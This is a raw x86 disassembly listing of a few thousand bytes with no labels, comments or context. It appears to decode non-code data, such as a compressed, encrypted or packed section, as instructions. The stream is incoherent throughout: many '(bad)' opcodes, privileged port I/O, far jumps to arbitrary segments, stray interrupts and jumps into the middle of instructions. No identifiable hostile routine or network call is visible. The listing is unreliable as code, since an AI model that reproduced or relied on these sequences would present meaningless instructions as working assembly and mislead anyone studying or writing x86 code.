  4155cd:	scas   al,BYTE PTR es:[edi]
  4155ce:	push   DWORD PTR [edi]
  4155d0:	jmp    0x4155b9
  4155d2:	or     DWORD PTR [ebp+eiz*4+0x130c3c0e],eax
  4155d9:	idiv   BYTE PTR [edx+0x24]
  4155dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155dd:	or     edx,esi
  4155df:	iret   
  4155e0:	or     ecx,DWORD PTR [ecx]
  4155e2:	fiadd  DWORD PTR [ebp-0x4d]
  4155e5:	adc    BYTE PTR [edx-0x5f],al
  4155e8:	pop    edx
  4155e9:	xor    esp,edx
  4155eb:	cld    
  4155ec:	cmc    
  4155ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155ee:	sub    bl,dh
  4155f0:	ror    DWORD PTR [ebp+0x22],cl
  4155f3:	pop    ebx
  4155f4:	lods   eax,DWORD PTR ds:[esi]
  4155f5:	test   BYTE PTR [edx-0x5],al
  4155f8:	or     DWORD PTR ds:0x33210b6f,ecx
  4155fe:	aad    0x98
  415600:	leave  
  415601:	js     0x4155b9
  415603:	sub    eax,0xa55abb17
  415608:	stc    
  415609:	sbb    cl,BYTE PTR [ebx+0x52]
  41560c:	daa    
  41560d:	(bad)  
  41560e:	xchg   ebx,eax
  41560f:	jno    0x415668
  415611:	cmc    
  415612:	popf   
  415613:	xchg   ebp,eax
  415614:	mov    ah,0x3a
  415616:	test   BYTE PTR [edx+0x1d],bl
  415619:	neg    BYTE PTR ds:[edx+eax*8]
  41561d:	inc    esp
  41561e:	dec    ecx
  41561f:	jae    0x415688
  415621:	nop
  415622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415623:	or     al,BYTE PTR [esi]
  415625:	xchg   edx,eax
  415626:	shr    bl,cl
  415628:	sbb    BYTE PTR [eax-0x4e],dl
  41562b:	dec    ebp
  41562c:	(bad)  
  41562d:	cmp    al,0x8e
  41562f:	fld    DWORD PTR [ebx]
  415631:	repnz (bad) 
  415633:	shl    BYTE PTR [eax],cl
  415635:	pop    edx
  415636:	xchg   DWORD PTR [esi+0xc],ebp
  415639:	and    ah,BYTE PTR [esi+0x7d]
  41563c:	lahf   
  41563d:	jne    0x4155fa
  41563f:	(bad)  
  415640:	fmul   QWORD PTR [eax-0x3d]
  415643:	shl    BYTE PTR [ecx-0x72c5406],0x93
  41564a:	ret    
  41564b:	add    DWORD PTR [ecx-0x7a],edi
  41564e:	and    eax,0x9e8f5d4
  415653:	pop    eax
  415654:	sti    
  415655:	addr16 loopne 0x41561f
  415658:	(bad)  
  415659:	cld    
  41565a:	cmp    eax,0xcf836d32
  41565f:	and    esi,DWORD PTR [ebx+ecx*1-0x27]
  415663:	mov    es,WORD PTR [eax]
  415665:	jns    0x415632
  415667:	add    BYTE PTR [ecx+0x605f184d],dl
  41566d:	pop    ds
  41566e:	inc    DWORD PTR [edi+0x6022b7c4]
  415674:	aaa    
  415675:	sbb    cl,al
  415677:	and    DWORD PTR es:[esp+ebp*8],ecx
  41567b:	das    
  41567c:	push   es
  41567d:	mov    gs,WORD PTR [edx]
  41567f:	adc    dl,dh
  415681:	dec    edx
  415682:	ins    DWORD PTR es:[edi],dx
  415683:	cmp    BYTE PTR [ecx],bl
  415685:	pop    ds
  415686:	inc    esp
  415687:	add    al,0xc6
  415689:	or     esi,ecx
  41568b:	dec    edx
  41568c:	add    DWORD PTR [esi-0x18],0x587a9c02
  415693:	lods   eax,DWORD PTR ds:[esi]
  415694:	xor    cl,BYTE PTR [ebp+0x67]
  415697:	mov    eax,0x69d4bad1
  41569c:	leave  
  41569d:	pop    ss
  41569e:	mov    al,ds:0xb13899dd
  4156a3:	inc    ebp
  4156a4:	pop    edx
  4156a5:	(bad)  
  4156a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a7:	jae    0x4156da
  4156a9:	jmp    0x918f7d87
  4156ae:	cmp    ebx,DWORD PTR [ebx+0x6c]
  4156b1:	or     BYTE PTR [eax-0x5de6ad92],dh
  4156b7:	cdq    
  4156b8:	dec    ebp
  4156b9:	inc    ebp
  4156ba:	mov    esp,0x170bba54
  4156bf:	dec    eax
  4156c0:	in     eax,0x21
  4156c2:	xor    ebp,DWORD PTR [edi+0x1d30d450]
  4156c8:	jae    0x415680
  4156ca:	bnd jno 0x415680
  4156cd:	(bad)  
  4156ce:	sbb    esp,DWORD PTR [esi+0x58]
  4156d1:	mov    bh,0x8b
  4156d3:	int    0xf1
  4156d5:	push   0xed844a67
  4156da:	retf   
  4156db:	loope  0x4156b3
  4156dd:	std    
  4156de:	pop    eax
  4156df:	imul   edi,DWORD PTR [edi],0x4c759aa2
  4156e5:	sub    DWORD PTR [eax],0x7b
  4156e8:	enter  0x3260,0xe6
  4156ec:	repnz and DWORD PTR ds:0x6d0431cc,ecx
  4156f3:	cdq    
  4156f4:	pop    es
  4156f5:	lahf   
  4156f6:	retf   
  4156f7:	and    cl,bh
  4156f9:	dec    esp
  4156fa:	inc    esi
  4156fb:	scas   al,BYTE PTR es:[edi]
  4156fc:	in     eax,dx
  4156fd:	cs xchg esi,eax
  4156ff:	je     0x415695
  415701:	cmc    
  415702:	(bad)  
  415703:	aaa    
  415704:	ficom  WORD PTR ds:0xe5cc6b58
  41570a:	cdq    
  41570b:	or     ch,al
  41570d:	push   ecx
  41570e:	fdiv   st,st(3)
  415710:	mov    dl,0x80
  415712:	jge    0x415779
  415714:	cmp    BYTE PTR [esi+0x4411de24],dl
  41571a:	add    eax,0x308106f1
  41571f:	mov    edx,DWORD PTR [ebx]
  415721:	dec    edx
  415722:	int3   
  415723:	cmp    ebx,eax
  415725:	jge    0x4156a7
  415727:	loopne 0x4156c6
  415729:	sbb    eax,0xcba80b1a
  41572e:	pop    ecx
  41572f:	and    DWORD PTR [ebp+0x6ca4ef94],eax
  415735:	aad    0x12
  415737:	xchg   BYTE PTR [eax+eax*8],ch
  41573a:	push   ebp
  41573b:	psraw  mm7,QWORD PTR [esi+0x2b5ef3d7]
  415742:	data16 xor bl,BYTE PTR [edi+ebp*1+0x28]
  415747:	inc    esi
  415748:	fisub  WORD PTR [eax+0x37]
  41574b:	or     al,BYTE PTR [ebp-0x64]
  41574e:	mov    edx,0xb7da97fc
  415753:	in     eax,dx
  415754:	aad    0xea
  415756:	pop    edi
  415757:	dec    esi
  415758:	push   es
  415759:	hlt    
  41575a:	in     al,0x3
  41575c:	or     eax,0xc90f8667
  415761:	mov    cl,BYTE PTR [eax+0x60767e24]
  415767:	inc    esp
  415768:	and    BYTE PTR [eax],ah
  41576a:	ss into 
  41576c:	in     al,dx
  41576d:	jno    0x4157ca
  41576f:	xchg   edx,eax
  415770:	mov    cl,0x51
  415772:	fld    DWORD PTR [edi+edi*2]
  415775:	push   ecx
  415776:	push   eax
  415777:	sbb    edx,DWORD PTR [ebx+ebp*2]
  41577a:	and    DWORD PTR [ebp-0x52],ebp
  41577d:	repnz push ebx
  41577f:	mov    bl,0x8f
  415781:	xor    BYTE PTR [edi+eax*4-0x5e],ch
  415785:	(bad)  
  415786:	jmp    0x7350945c
  41578b:	jnp    0x4157eb
  41578d:	outs   dx,DWORD PTR ds:[esi]
  41578e:	dec    ebp
  41578f:	or     eax,DWORD PTR ds:[edx]
  415792:	fiadd  DWORD PTR [ebx]
  415794:	push   eax
  415795:	popf   
  415796:	mov    dh,0xe3
  415798:	xor    al,0x1b
  41579a:	imul   esp,DWORD PTR [esi+0x2c],0x37
  41579e:	outs   dx,DWORD PTR ds:[esi]
  41579f:	inc    edx
  4157a0:	sahf   
  4157a1:	jmp    0xc5d0d4b8
  4157a6:	inc    ebx
  4157a7:	or     eax,0xee91379e
  4157ac:	xchg   BYTE PTR [ecx],dh
  4157ae:	sbb    BYTE PTR [ebp+edx*2+0x2d],al
  4157b2:	aaa    
  4157b3:	(bad)  
  4157b4:	mov    BYTE PTR [ecx+0x5b4f1bc3],ah
  4157ba:	daa    
  4157bb:	mov    esp,0x1a12336a
  4157c0:	lods   al,BYTE PTR ds:[esi]
  4157c1:	in     eax,0x5a
  4157c3:	jmp    0x415746
  4157c5:	lods   eax,DWORD PTR ds:[esi]
  4157c6:	lods   eax,DWORD PTR ds:[esi]
  4157c7:	or     al,0xdf
  4157c9:	data16 sub cl,BYTE PTR [edi+0x63]
  4157cd:	outs   dx,DWORD PTR ds:[esi]
  4157ce:	scas   al,BYTE PTR es:[edi]
  4157cf:	mov    ch,0xb9
  4157d1:	sbb    ecx,DWORD PTR [esi+edi*2+0x1f8199f1]
  4157d8:	sub    eax,0x9cdcb971
  4157dd:	sub    eax,0x238f896f
  4157e2:	push   edx
  4157e3:	fst    QWORD PTR [edi]
  4157e5:	pop    esp
  4157e6:	outs   dx,DWORD PTR ds:[esi]
  4157e7:	mov    ebx,0x80efc068
  4157ec:	imul   ebp,DWORD PTR [eax-0x6cad5c7f],0x252ff0d5
  4157f6:	cmc    
  4157f7:	rcl    ecx,0xdd
  4157fa:	xchg   edx,eax
  4157fb:	adc    BYTE PTR [eax+0x2449a476],al
  415801:	xchg   edx,eax
  415802:	pop    eax
  415803:	(bad)  [esp+eiz*2]
  415806:	sub    al,0x8c
  415808:	pop    ss
  415809:	lea    edx,[eax-0x4f8985d2]
  41580f:	and    ebp,DWORD PTR [eax-0x4f546d29]
  415815:	stos   BYTE PTR es:[edi],al
  415816:	js     0x4157f7
  415818:	or     ebx,DWORD PTR [edi]
  41581a:	jno    0x4157e7
  41581c:	and    dh,bl
  41581e:	dec    edi
  41581f:	inc    ebx
  415820:	nop
  415821:	xchg   ebp,eax
  415822:	sub    al,0x4e
  415824:	mov    al,0xa6
  415826:	cdq    
  415827:	aam    0x3d
  415829:	cli    
  41582a:	jno    0x4158a1
  41582c:	dec    edi
  41582d:	je     0x41582b
  41582f:	xchg   ecx,eax
  415830:	mov    DWORD PTR [esi],ebp
  415832:	sbb    BYTE PTR ds:0x9d97dcb0,dl
  415838:	repz out 0x45,eax
  41583b:	mov    ebx,0x9c62c13d
  415840:	aad    0x23
  415842:	mov    WORD PTR [edx+0x27d2a3ca],?
  415848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415849:	cmp    al,0xbd
  41584b:	xchg   ebp,eax
  41584c:	jo     0x415808
  41584e:	or     BYTE PTR [eax+0x18],bl
  415851:	inc    eax
  415852:	stos   DWORD PTR es:[edi],eax
  415853:	jnp    0x415896
  415855:	outs   dx,DWORD PTR ds:[esi]
  415856:	addr16 test eax,0x5926b1b6
  41585c:	ins    DWORD PTR es:[edi],dx
  41585d:	loop   0x415823
  41585f:	cld    
  415860:	fneni(8087 only) 
  415862:	adc    al,0xfe
  415864:	std    
  415865:	ret    0x6fcb
  415868:	ss loop 0x4157fe
  41586b:	ret    
  41586c:	sub    BYTE PTR [edi+ebp*2-0x1c96ed1b],ah
  415873:	scas   al,BYTE PTR es:[edi]
  415874:	mov    ds:0x44261c51,al
  415879:	push   cs
  41587a:	push   0xe59d79ac
  41587f:	out    0xda,eax
  415881:	mov    ebp,0xf0d5ea54
  415886:	sbb    eax,0x8703a0b4
  41588b:	iret   
  41588c:	test   esi,ebx
  41588e:	adc    DWORD PTR [esi+eiz*1-0x39],ecx
  415892:	loope  0x4158b7
  415894:	(bad)  
  415895:	xor    al,0x51
  415897:	lock mov ch,0xf1
  41589a:	pusha  
  41589b:	pop    es
  41589c:	mov    cl,0xe3
  41589e:	push   DWORD PTR ds:0x1949a790
  4158a4:	es fwait
  4158a6:	lods   al,BYTE PTR ds:[esi]
  4158a7:	pop    edi
  4158a8:	lds    ebx,FWORD PTR [ebp-0x5]
  4158ab:	fldcw  WORD PTR [edi]
  4158ad:	jl     0x415906
  4158af:	sub    al,0x41
  4158b1:	xchg   ebp,eax
  4158b2:	inc    ebx
  4158b3:	jbe    0x41588b
  4158b5:	shr    DWORD PTR [ecx+0x2d8a2d04],cl
  4158bb:	retf   0x624b
  4158be:	cmp    ecx,DWORD PTR [edx]
  4158c0:	(bad)  
  4158c1:	retf   
  4158c2:	mov    ds:0x959a5047,al
  4158c7:	jne    0x415892
  4158c9:	mov    cl,0x27
  4158cb:	(bad)  [ebx+0x5e]
  4158ce:	sbb    edi,DWORD PTR [eax+eiz*1]
  4158d1:	xlat   BYTE PTR fs:[ebx]
  4158d3:	jge    0x4158db
  4158d5:	cmc    
  4158d6:	push   ss
  4158d7:	sar    DWORD PTR [edx+0x23a2cd1f],0xd0
  4158de:	lods   al,BYTE PTR ds:[esi]
  4158df:	jp     0x415954
  4158e1:	outs   dx,BYTE PTR ds:[esi]
  4158e2:	adc    ch,ch
  4158e4:	mov    al,ds:0xdd262487
  4158e9:	push   cs
  4158ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158eb:	dec    ebx
  4158ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158ed:	mov    ah,0x88
  4158ef:	pop    es
  4158f0:	pop    edx
  4158f1:	loope  0x41595f
  4158f3:	xor    dl,BYTE PTR [ebx+0x6529ef7f]
  4158f9:	scas   eax,DWORD PTR es:[edi]
  4158fa:	xor    WORD PTR [eax],bx
  4158fd:	dec    eax
  4158fe:	sbb    BYTE PTR [ebx+eiz*2],cl
  415901:	cmp    eax,0x8b8747c1
  415906:	mov    ecx,0x47442e66
  41590b:	mov    ch,0x4a
  41590d:	cmp    dh,BYTE PTR [ebx-0x64]
  415910:	sub    DWORD PTR [ebp-0x7d8f306f],esi
  415916:	or     DWORD PTR [edx+0x55f3f5c8],ebx
  41591c:	mov    ch,0xb5
  41591e:	jmp    0x4158f3
  415920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415921:	js     0x41590c
  415923:	sahf   
  415924:	je     0x415910
  415926:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415927:	push   esi
  415928:	cmp    edx,esi
  41592a:	mov    eax,0x5ad4fdfc
  41592f:	push   0x3e
  415931:	adc    al,0x60
  415933:	cmp    BYTE PTR ds:0x60af69da,cl
  415939:	mov    ds:0x461a5ffc,eax
  41593e:	dec    ecx
  41593f:	ror    BYTE PTR [edx],1
  415941:	out    dx,al
  415942:	pop    eax
  415943:	push   ss
  415944:	scas   eax,DWORD PTR es:[edi]
  415945:	push   edi
  415946:	aam    0x6a
  415948:	xor    eax,DWORD PTR [eax]
  41594a:	sbb    BYTE PTR [ecx],dh
  41594c:	and    ah,BYTE PTR [eax]
  41594e:	loope  0x415967
  415950:	push   0xffffffae
  415952:	shl    ah,0xaf
  415955:	(bad)  
  415956:	out    0xf8,al
  415958:	cmp    ah,BYTE PTR [edx]
  41595a:	pop    edx
  41595b:	sbb    eax,0x876400e0
  415960:	(bad)  
  415961:	cli    
  415962:	mov    edx,0xda95b722
  415967:	lods   eax,DWORD PTR ds:[esi]
  415968:	cmp    BYTE PTR [ecx+0x73],dh
  41596b:	push   ecx
  41596c:	fucom  st(0)
  41596f:	gs dec ecx
  415971:	dec    eax
  415972:	lods   eax,DWORD PTR es:[esi]
  415974:	mov    esi,0x67fb91d7
  415979:	push   0xb163fefd
  41597e:	jp     0x41598d
  415980:	mov    bl,0x14
  415982:	jl     0x415917
  415984:	cmp    al,0xdb
  415986:	sbb    cl,BYTE PTR [edi-0x69]
  415989:	clc    
  41598a:	add    DWORD PTR [edi],0xffffffbd
  41598d:	xor    esi,DWORD PTR [edx]
  41598f:	add    eax,0xc568d7a9
  415994:	push   ebp
  415995:	inc    edx
  415996:	mov    ds:0x6c98e69d,al
  41599b:	jg     0x41599b
  41599d:	cmp    esi,ebp
  41599f:	ja     0x41593e
  4159a1:	int3   
  4159a2:	mov    BYTE PTR [esi+ecx*8-0x28],cl
  4159a6:	mov    WORD PTR ds:0x43e005c,?
  4159ac:	ss dec eax
  4159ae:	fcmovnu st,st(3)
  4159b0:	sar    bl,cl
  4159b2:	mov    dh,0x37
  4159b4:	jb     0x4159b2
  4159b6:	aad    0xe9
  4159b8:	loopne 0x4159f6
  4159ba:	daa    
  4159bb:	mov    eax,0x6d6201d0
  4159c0:	jb     0x4159fe
  4159c2:	sub    eax,0x8a60adc3
  4159c7:	dec    ecx
  4159c8:	xchg   BYTE PTR [eax+0x6f50982e],dl
  4159ce:	nop
  4159cf:	sbb    eax,0x713fd502
  4159d4:	gs jmp 0x4159cf
  4159d7:	mov    ebp,0x935f2015
  4159dc:	push   edx
  4159dd:	adc    al,0x48
  4159e0:	int3   
  4159e1:	adc    BYTE PTR [eax],bl
  4159e3:	and    al,0x6e
  4159e5:	icebp  
  4159e6:	and    al,0x56
  4159e8:	mov    ds:0x7fec4044,al
  4159ed:	xchg   esp,eax
  4159ee:	jbe    0x415a01
  4159f0:	push   edi
  4159f1:	and    DWORD PTR [ebx],0xffffffef
  4159f4:	imul   esp,ebp,0xbc03e320
  4159fa:	mov    esp,0x48481b2b
  4159ff:	ja     0x415a4c
  415a01:	test   al,0xb9
  415a03:	xor    al,0xca
  415a05:	mov    ebp,0x46ed0c79
  415a0a:	xchg   edi,eax
  415a0b:	mov    edx,DWORD PTR [eax-0x60]
  415a0e:	test   esp,0x211a6de2
  415a14:	push   0x34dbeed2
  415a19:	cmp    DWORD PTR [ebx+0x2d7ff255],esi
  415a1f:	sub    DWORD PTR [ebx+0x456a145a],esi
  415a25:	es inc esi
  415a27:	mov    ebx,0xa0c6c8d6
  415a2c:	jnp    0x415a67
  415a2e:	jo     0x4159b3
  415a30:	mov    bl,0xa7
  415a32:	pop    ds
  415a33:	ffree  st(0)
  415a35:	push   edi
  415a36:	push   edx
  415a37:	stos   DWORD PTR es:[edi],eax
  415a38:	xor    dh,BYTE PTR [eax]
  415a3a:	mov    ch,0xf0
  415a3c:	outs   dx,BYTE PTR ds:[esi]
  415a3d:	inc    ebp
  415a3e:	(bad)  
  415a3f:	xlat   BYTE PTR ds:[ebx]
  415a40:	cmp    al,0x5e
  415a42:	sbb    esi,DWORD PTR [ecx]
  415a44:	xchg   BYTE PTR [esi+0x7c],bh
  415a47:	add    DWORD PTR [ecx+0x6b5f7725],ebx
  415a4d:	leave  
  415a4e:	pop    eax
  415a4f:	jmp    0x39cd:0x7b3bf1ac
  415a56:	pop    ds
  415a57:	and    al,0x6f
  415a59:	fs sbb al,0x3b
  415a5c:	pop    eax
  415a5d:	jb     0x415a35
  415a5f:	inc    ebp
  415a60:	inc    esi
  415a61:	adc    dl,bh
  415a63:	add    eax,0x9dec36e7
  415a68:	or     BYTE PTR [ebp+0x29f8f154],cl
  415a6e:	jmp    ebx
  415a70:	mov    BYTE PTR [esi+0x26],dh
  415a73:	cld    
  415a74:	adc    ebp,0x31
  415a77:	push   ds
  415a78:	ds ret 0x4e20
  415a7c:	xchg   ch,dl
  415a7e:	inc    ebp
  415a7f:	cs mov esi,0xc7347c2
  415a85:	retf   0x43af
  415a88:	xchg   esi,eax
  415a89:	or     DWORD PTR [eax-0x7f],edx
  415a8c:	shl    edx,cl
  415a8e:	mov    eax,ebp
  415a90:	inc    ebx
  415a91:	and    cl,BYTE PTR [esi-0x2593f614]
  415a97:	dec    esp
  415a98:	and    al,0x24
  415a9a:	in     al,dx
  415a9b:	sbb    al,0x99
  415a9d:	add    esp,esi
  415a9f:	shl    BYTE PTR [esp+esi*1+0x163bc505],0x70
  415aa7:	dec    ebx
  415aa8:	data16 jno 0x415a93
  415aab:	in     eax,0x85
  415aad:	dec    edi
  415aae:	cmp    BYTE PTR [ebx],ch
  415ab0:	int    0x98
  415ab2:	inc    ebp
  415ab3:	push   edx
  415ab4:	out    0x68,eax
  415ab6:	jo     0x415a64
  415ab8:	push   edi
  415ab9:	mov    dl,0x71
  415abb:	(bad)  
  415abc:	xchg   esi,eax
  415abd:	das    
  415abe:	es leave 
  415ac0:	sub    cl,BYTE PTR [ebx-0x3a]
  415ac3:	dec    ebp
  415ac4:	dec    eax
  415ac5:	mov    BYTE PTR [ebx+0x73721bc3],ch
  415acb:	and    al,0xd0
  415acd:	aad    0x44
  415acf:	in     eax,dx
  415ad0:	rcr    eax,0x75
  415ad3:	ret    0xddda
  415ad6:	fimul  DWORD PTR [edx]
  415ad8:	pop    edx
  415ad9:	das    
  415ada:	mov    bl,0x9d
  415adc:	(bad)  
  415add:	popa   
  415ade:	adc    eax,0x9d82a6fb
  415ae3:	rcl    BYTE PTR [ecx],cl
  415ae5:	add    ch,BYTE PTR [eax-0x3e]
  415ae8:	cmp    bl,BYTE PTR ds:0x214a211d
  415aee:	mov    ds:0x179f26dc,al
  415af3:	jp     0x415b66
  415af5:	push   eax
  415af6:	mov    dh,0xb6
  415af8:	mov    ah,0x6a
  415afa:	stos   DWORD PTR es:[edi],eax
  415afb:	out    0xc9,eax
  415afd:	pop    esp
  415afe:	sbb    BYTE PTR [eax-0x3188c35d],dh
  415b04:	xor    ebp,edx
  415b06:	sub    DWORD PTR [esi+0x79191e13],eax
  415b0c:	pop    ss
  415b0d:	sub    BYTE PTR [edi+edi*2-0x54f0a2c9],dh
  415b14:	arpl   WORD PTR [eax+0xb],sp
  415b17:	fnstenv [ebp+edx*2+0x3b2878f3]
  415b1e:	into   
  415b1f:	mov    dh,0x5e
  415b21:	dec    eax
  415b22:	mov    al,ds:0x4d5e9fe9
  415b27:	inc    ecx
  415b28:	cmp    eax,0xac392226
  415b2d:	mov    eax,0x8be948d0
  415b32:	ror    DWORD PTR [ecx+0x5f9c47fd],cl
  415b38:	call   0x1d59:0xe01e0ea3
  415b3f:	fbld   TBYTE PTR [ecx+0xc48754a]
  415b45:	jp     0x415af9
  415b47:	in     eax,dx
  415b48:	mov    dh,BYTE PTR [edi+0x1]
  415b4b:	mov    esi,0x2479f1be
  415b50:	scas   al,BYTE PTR es:[edi]
  415b51:	adc    ebx,ebp
  415b53:	(bad)  
  415b54:	jg     0x415b26
  415b56:	addr16 repnz push ds
  415b59:	ror    DWORD PTR [ebx+0x1a],0x96
  415b5d:	push   eax
  415b5e:	cmp    eax,0x28037c22
  415b63:	scas   al,BYTE PTR es:[edi]
  415b64:	cmp    al,0x1e
  415b66:	xor    esi,DWORD PTR cs:[edx+0x3652855d]
  415b6d:	rcl    DWORD PTR ds:0xd24fa484,0x98
  415b74:	cmp    dh,bl
  415b76:	push   ebp
  415b77:	(bad)  
  415b78:	call   0xf44b2127
  415b7d:	aaa    
  415b7e:	mov    ds:0xcc5e316,al
  415b83:	mov    ebx,0x8812f46d
  415b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b89:	lea    ecx,[eax-0x4950b621]
  415b8f:	add    BYTE PTR [eax+esi*1],ah
  415b92:	scas   eax,DWORD PTR es:[edi]
  415b93:	loopne 0x415b72
  415b95:	adc    eax,0xcc1fef94
  415b9a:	pop    esi
  415b9b:	jnp    0x415b22
  415b9d:	lea    esi,[ecx-0x19]
  415ba0:	jg     0x415b67
  415ba2:	xor    BYTE PTR [edi],bl
  415ba4:	fmul   DWORD PTR [eax+0x6a0263a3]
  415baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bab:	xchg   edx,eax
  415bac:	xchg   DWORD PTR [esi-0x7d],eax
  415baf:	test   BYTE PTR [eax-0x40],bh
  415bb2:	fst    DWORD PTR [esi]
  415bb4:	jno    0x415b98
  415bb6:	dec    eax
  415bb7:	in     eax,0xff
  415bb9:	cmp    ebx,DWORD PTR [ebp+0x24]
  415bbc:	sub    eax,0xa538cd57
  415bc1:	xchg   esi,eax
  415bc2:	loopne 0x415c2e
  415bc4:	enter  0xa63a,0xbe
  415bc8:	xchg   ebx,eax
  415bc9:	push   0xffffff94
  415bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bcc:	dec    ebx
  415bcd:	xor    DWORD PTR [eax+0x63530665],eax
  415bd3:	imul   BYTE PTR [eax-0x3f]
  415bd6:	idiv   DWORD PTR [edi+0xe]
  415bd9:	mov    ds:0x9436314e,eax
  415bde:	js     0x415b77
  415be0:	adc    DWORD PTR [ecx-0x5],ebx
  415be3:	scas   eax,DWORD PTR es:[edi]
  415be4:	icebp  
  415be5:	lea    eax,[ecx]
  415be7:	push   0xbdad682b
  415bec:	push   0x53eaa493
  415bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf2:	in     eax,0x49
  415bf4:	sub    al,BYTE PTR ds:0x4ef83a96
  415bfa:	into   
  415bfb:	push   ss
  415bfc:	and    DWORD PTR [esi+0x52],ebp
  415bff:	push   edi
  415c00:	inc    DWORD PTR [eax-0x22]
  415c03:	and    ecx,edi
  415c05:	sub    DWORD PTR [esp+ecx*4],ecx
  415c08:	jns    0x415bd1
  415c0a:	pop    edi
  415c0b:	int3   
  415c0c:	in     eax,dx
  415c0d:	and    cl,BYTE PTR [edx]
  415c0f:	in     al,0xa8
  415c11:	dec    edx
  415c12:	pop    eax
  415c13:	std    
  415c14:	mov    ?,WORD PTR [edi]
  415c16:	rol    BYTE PTR [ebx],1
  415c18:	into   
  415c19:	hlt    
  415c1a:	or     eax,0x252595dc
  415c1f:	pop    edx
  415c20:	and    al,0x71
  415c22:	mov    esp,0x95f47a2d
  415c27:	stc    
  415c28:	ins    BYTE PTR es:[edi],dx
  415c29:	xor    cl,BYTE PTR [ecx+0x216b417c]
  415c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c30:	sub    ebx,eax
  415c32:	ja     0x415bd7
  415c34:	fnstcw WORD PTR [ebp-0x41]
  415c37:	cmp    eax,edx
  415c39:	ins    DWORD PTR es:[edi],dx
  415c3a:	int3   
  415c3b:	popa   
  415c3c:	fcomp  DWORD PTR [edx+0x538eccde]
  415c42:	test   DWORD PTR [ebx-0x4e],edi
  415c45:	pop    ss
  415c46:	mov    al,ds:0xa52f5bff
  415c4b:	mov    ebx,0x182b4989
  415c50:	dec    ebp
  415c51:	dec    ebx
  415c52:	pop    ebp
  415c53:	sub    DWORD PTR ds:0x36315d4f,ecx
  415c59:	jecxz  0x415c80
  415c5b:	cmp    eax,0x1ff9102
  415c60:	mov    ds:0xadfa0075,al
  415c65:	loope  0x415c20
  415c67:	push   eax
  415c68:	fnstsw WORD PTR [edx+eiz*1-0x20]
  415c6c:	leave  
  415c6d:	in     eax,0xcb
  415c6f:	shr    BYTE PTR [edi],0xcb
  415c72:	inc    ebp
  415c73:	adc    BYTE PTR [ecx-0x21],bl
  415c76:	cmp    eax,0xb72fa719
  415c7b:	scas   eax,DWORD PTR es:[edi]
  415c7c:	sub    ch,dl
  415c7e:	in     eax,dx
  415c7f:	ficom  WORD PTR [ecx]
  415c81:	mul    BYTE PTR [edi+edi*2-0x7a]
  415c85:	push   edx
  415c86:	jno    0x415ce8
  415c88:	cli    
  415c89:	aad    0x47
  415c8b:	mov    ah,0x5d
  415c8d:	mov    ebx,0x4955e7cd
  415c92:	fld    DWORD PTR [esi+0x59]
  415c95:	and    edi,eax
  415c97:	mov    WORD PTR [edi],ss
  415c99:	cmp    DWORD PTR [edi-0x5b],esp
  415c9c:	scas   eax,DWORD PTR es:[edi]
  415c9d:	inc    esi
  415c9e:	out    0xe6,eax
  415ca0:	pushf  
  415ca1:	into   
  415ca2:	(bad)  
  415ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca4:	clc    
  415ca5:	jbe    0x415ca9
  415ca7:	gs and sp,dx
  415cab:	cmp    eax,0x673dd3b8
  415cb0:	int    0x6
  415cb2:	mov    ecx,esp
  415cb4:	scas   al,BYTE PTR es:[edi]
  415cb5:	popf   
  415cb6:	in     eax,0xe9
  415cb8:	push   esp
  415cb9:	pop    ds
  415cba:	leave  
  415cbb:	lea    ecx,[ebp+0x62]
  415cbe:	pushf  
  415cbf:	dec    ebx
  415cc0:	lock sbb DWORD PTR [ebp-0x63],esi
  415cc4:	ss jecxz 0x415ce8
  415cc7:	dec    esp
  415cc8:	(bad)  
  415cca:	cmc    
  415ccb:	mov    ch,0xa
  415ccd:	dec    eax
  415cce:	jmp    FWORD PTR [ebp+0x78]
  415cd1:	sbb    ah,BYTE PTR [ecx]
  415cd3:	push   esi
  415cd4:	cmp    BYTE PTR ds:0x673611a2,0xe5
  415cdb:	jmp    0x67d4:0x50b68bd5
  415ce2:	push   edx
  415ce3:	(bad)  
  415ce4:	and    ah,BYTE PTR [ebp-0x2b]
  415ce7:	jnp    0x415cbf
  415ce9:	add    al,dl
  415ceb:	test   DWORD PTR [esi-0x5f61dd4e],0x88dbe83b
  415cf5:	pop    ebx
  415cf6:	loopne 0x415ce4
  415cf8:	pop    ss
  415cf9:	test   al,0xde
  415cfb:	ret    
  415cfc:	push   ss
  415cfd:	imul   ecx,DWORD PTR [eax+eax*4+0x176e8ba],0xffffffbd
  415d05:	jnp    0x415d16
  415d07:	push   edi
  415d08:	les    ebx,FWORD PTR [ecx]
  415d0a:	cwde   
  415d0b:	(bad)  
  415d0c:	mov    ecx,0xa0f110
  415d11:	retf   0x8158
  415d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d15:	es cdq 
  415d17:	mov    DWORD PTR [esi+0x589b7595],ecx
  415d1d:	lods   eax,DWORD PTR ds:[esi]
  415d1e:	sar    edx,cl
  415d20:	dec    ecx
  415d21:	lods   eax,DWORD PTR ds:[esi]
  415d22:	cmp    edx,ebx
  415d24:	adc    BYTE PTR [ebx+0x70],ah
  415d27:	scas   al,BYTE PTR es:[edi]
  415d28:	xor    eax,0xe713b5f9
  415d2d:	or     dl,al
  415d2f:	add    DWORD PTR [bx+si+0x8],esp
  415d33:	outs   dx,DWORD PTR es:[esi]
  415d35:	in     al,dx
  415d36:	push   esp
  415d37:	retf   
  415d38:	inc    esi
  415d39:	ret    0x31bd
  415d3c:	jnp    0x415ce6
  415d3e:	push   gs
